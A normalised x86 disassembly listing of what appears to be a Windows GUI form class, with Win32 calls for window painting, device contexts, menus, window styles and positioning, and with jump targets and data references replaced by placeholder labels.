mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45e49c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46310f
xor edx edx
mov eax [ ebp - 0xc ]
call sub_425038
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45cfb4
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4637d8
call sub_45071c
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_463253
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46322c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46320f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_425038
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424ed8
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463216
xor edx edx
mov eax [ ebp - 0xc ]
call sub_425038
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_45071c
mov esi eax
sub_463233
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ReleaseDC
retn
sub_4632e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_463330
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46380c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_463858
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_463370
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_46353e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424828
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44e3d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_449964
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44875c
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_4632e4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424828
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_46380c
test eax eax
je r-xdata
push ebp
call sub_4632e4
pop ecx
push ebp
call sub_4632e4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_463330
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_460634
jmp r-xdata
sub_463550
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_461818
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_4635bc
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_461eb4
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax ebx
call sub_4215f0
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_45071c
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44d540
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_45071c
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4215c4
call sub_45daf8
mov edx esi
mov eax ebx
call sub_4215c4
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_463654
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_4636d1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_4636dc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44dcbc
sub_463708
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44dcbc
xor edx edx
jmp r-xdata
mov eax esi
call sub_461994
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_463740
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_449624
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44dcbc
sub_463784
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_449730
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_4637d8
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_446d00
sub_46380c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46737c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_467368
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_463858
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46737c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467368
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4638a8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_418454
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_4638d8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_45071c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_46734c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_46734c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_4638a8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_46734c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_467338
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4185b0
call sub_403154
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_467338
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_467338
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_467338
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_4639dc
push ebx
mov ebx eax
mov eax ebx
call sub_4639d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_42907c
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_463a04
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_44dc74
mov dl 0x1
mov eax esi
call sub_463d68
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_463de4
mov edx eax
mov eax esi
call sub_449fc0
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_44de10
mov dl 0x1
mov eax esi
call sub_462d88
sub_463a84
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_45071c
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_45a0f4
mov edi eax
mov eax ebp
call sub_45071c
push eax
call DrawMenuBar
sub_463b00
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_42109c
xor edx edx
mov eax ebx
call sub_45ba8c
sub_463b24
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_463a84
mov eax edx
mov edx ebx
call sub_42109c
sub_463b4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463d12
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46737c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45d640
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467368
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_42109c
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467368
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
mov eax ebx
call sub_450a20
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_45071c
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_463a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d19
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
mov dl 0x1
mov eax ebx
call sub_464c10
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_45071c
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_45071c
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_45071c
mov edx eax
mov eax esi
call sub_45d640
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_45071c
push eax
call SetMenu
sub_463d34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_463d20
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_463d90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_463d84
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_463dfc
push ebx
mov ebx eax
mov eax ebx
call sub_44fd34
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_463de4
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_463de4
mov edx eax
mov eax ebx
call sub_449fc0
mov edx 0xff00000f
mov eax ebx
call sub_449fc0
pop ebx
retn
sub_463e80
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_45071c
push eax
call ShowWindow
sub_463ec0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4638d8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_4638d8
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_46734c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_467338
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_4638d8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467338
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_46734c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_467338
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_46703c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467020
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467008
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_467338
call sub_467008
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467008
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467054
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_46703c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467020
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467008
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467054
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_46703c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_467338
call sub_46703c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_46703c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467020
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467008
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467054
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467008
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467054
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_46703c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467338
call sub_467020
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_464214
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4617c8
mov edx esi
mov eax edi
call sub_466bb8
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_4642c3 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44d540
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44d540
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_464425
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
